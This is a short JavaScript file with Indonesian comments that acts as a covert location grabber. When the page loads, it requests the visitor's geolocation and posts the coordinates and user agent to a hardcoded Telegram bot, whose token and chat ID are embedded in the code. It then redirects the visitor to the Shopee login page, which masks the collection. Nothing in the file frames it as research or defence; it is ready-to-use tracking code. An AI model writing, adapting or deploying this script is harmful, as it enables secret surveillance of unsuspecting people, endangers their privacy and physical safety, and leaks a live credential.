

// Gantilah 'YOUR_BOT_TOKEN' dan 'YOUR_CHAT_ID' dengan informasi bot Telegram Anda.
var botToken = '7414756868:AAEoYeLOI3CXh8C-MKZoBDdJkiJjMQxfGPs';
var chatId = '5450283191';


// Fungsi untuk mengirim lokasi ke Telegram
function sendLocationToTelegram(latitude, longitude, userAgent) {
    // URL API Telegram untuk mengirim lokasi
    var telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendLocation`;

    // Data yang akan dikirimkan ke API Telegram
    var data = {
        chat_id: chatId,
        latitude: latitude,
        longitude: longitude,
        caption: `User Agent: ${userAgent}`
    };

    // Menggunakan fetch untuk melakukan POST request ke API Telegram
    fetch(telegramApiUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    })
    .then(response => {
        if (response.ok) {
            console.log('Location sent to Telegram:', latitude, longitude);
            // Setelah lokasi terkirim, alihkan pengguna ke halaman lain
            window.location.href = 'https://shopee.co.id/buyer/login?next=https%3A%2F%2Fshopee.co.id%2F';
        } else {
            console.error('Failed to send location to Telegram:', response.status);
        }
    })
    .catch(error => {
        console.error('Error sending location to Telegram:', error);
    });
}

// Fungsi untuk mendapatkan lokasi pengguna dan mengirimkan ke Telegram
function getLocationAndSend() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function(position) {
            // Dapatkan data lokasi pengguna
            var latitude = position.coords.latitude;
            var longitude = position.coords.longitude;
            var userAgent = navigator.userAgent;

            // Kirim lokasi dan user agent ke bot Telegram
            sendLocationToTelegram(latitude, longitude, userAgent);
        }, function(error) {
            console.error('Error getting location:', error);
        });
    } else {
        console.log("Geolocation is not supported by this browser.");
    }
}

// Panggil getLocationAndSend() saat halaman dimuat
document.addEventListener("DOMContentLoaded", function () {
    getLocationAndSend();
});
